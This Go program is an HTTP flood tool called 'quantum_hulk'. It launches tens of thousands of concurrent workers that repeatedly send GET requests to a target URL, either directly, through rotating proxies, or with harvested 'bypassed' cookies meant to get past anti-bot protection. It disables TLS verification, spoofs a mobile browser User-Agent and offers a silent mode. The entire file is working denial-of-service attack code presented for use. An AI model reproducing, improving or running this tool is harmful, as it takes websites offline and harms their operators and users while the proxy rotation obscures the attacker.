package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	sentCount    int64
	successCount int64
	errorCount   int64

	cookieList []string
	proxyList  []string
	
	showStats bool = false
)

func main() {
	args := os.Args[1:]
	if len(args) < 3 || strings.ToUpper(args[0]) != "ULTIMATE" {
		fmt.Println("Usage: ./quantum_hulk ULTIMATE <url> <mode> <threads> [file] [stats]")
		fmt.Println("       stats: 'show' to display stats, anything else for silent mode")
		os.Exit(1)
	}

	target := args[1]
	mode := args[2]
	threadsNum, _ := strconv.Atoi(args[3])
	if threadsNum < 1000 { threadsNum = 80000 }

	var file string
	if len(args) > 4 {
		file = args[4]
	}
	
	// Check if we should show stats
	if len(args) > 5 && args[5] == "show" {
		showStats = true
	}

	u, err := url.Parse(target)
	if err != nil {
		fmt.Printf("Bad URL: %v\n", err)
		os.Exit(1)
	}

	switch mode {
	case "proxy":
		proxyList = loadFile(file)
		fmt.Printf("LOADED %d PROXIES\n", len(proxyList))
	case "cookie":
		cookieList = loadFile(file)
		fmt.Printf("LOADED %d BYPASSED COOKIES\n", len(cookieList))
	case "raw":
		fmt.Println("RAW DIRECT MODE")
	default:
		fmt.Println("Invalid mode!")
		os.Exit(1)
	}

	fmt.Printf("\nTARGET → %s\n", target)
	fmt.Printf("MODE → %s | THREADS → %d\n", strings.ToUpper(mode), threadsNum)
	if showStats {
		fmt.Println("STATUS: LIVE STATS ENABLED")
		go stats()
	} else {
		fmt.Println("STATUS: SILENT MODE - NO OUTPUT")
	}
	fmt.Println("ATTACK STARTED - PRESS CTRL+Z TO STOP\n")

	// Handle termination
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	
	// Start all workers
	for i := 0; i < threadsNum; i++ {
		go worker(target, u.Host, mode)
	}

	// Wait for interrupt
	<-c
	
	// Clear line if stats were showing
	if showStats {
		fmt.Print("\r")
	}
	
	fmt.Printf("\n\nSTOPPED | SENT:%d SUCCESS:%d ERROR:%d\n",
		atomic.LoadInt64(&sentCount),
		atomic.LoadInt64(&successCount),
		atomic.LoadInt64(&errorCount))
}

func loadFile(path string) []string {
	if path == "" { return []string{} }
	f, _ := os.Open(path)
	defer f.Close()
	var l []string
	s := bufio.NewScanner(f)
	for s.Scan() {
		if x := strings.TrimSpace(s.Text()); x != "" {
			l = append(l, x)
		}
	}
	return l
}

func worker(target, host, mode string) {
	tr := &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: false,
	}
	http2.ConfigureTransport(tr)
	client := &http.Client{Transport: tr, Timeout: 12 * time.Second}

	for {
		var proxyURL, cookie string
		if mode == "cookie" {
			if len(cookieList) > 0 {
				line := cookieList[rand.Intn(len(cookieList))]
				p := strings.SplitN(line, " ", 2)
				proxyURL = "http://" + p[0]
				if len(p) > 1 { cookie = p[1] }
			}
		} else if mode == "proxy" {
			if len(proxyList) > 0 {
				proxyURL = "http://" + proxyList[rand.Intn(len(proxyList))]
			}
		}

		if proxyURL != "" {
			if p, err := url.Parse(proxyURL); err == nil {
				tr.Proxy = http.ProxyURL(p)
			}
		}

		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 13)")
		req.Header.Set("Accept", "*/*")
		if cookie != "" {
			req.Header.Set("Cookie", cookie)
		}

		resp, err := client.Do(req)
		atomic.AddInt64(&sentCount, 1)
		if err != nil {
			atomic.AddInt64(&errorCount, 1)
			continue
		}
		resp.Body.Close()
		atomic.AddInt64(&successCount, 1)
	}
}

func stats() {
	for {
		time.Sleep(1 * time.Second)
		s := atomic.LoadInt64(&sentCount)
		sc := atomic.LoadInt64(&successCount)
		e := atomic.LoadInt64(&errorCount)
		
		fmt.Printf("\rSENT:%-10d SUCCESS:%-10d ERROR:%-10d", s, sc, e)
	}
}
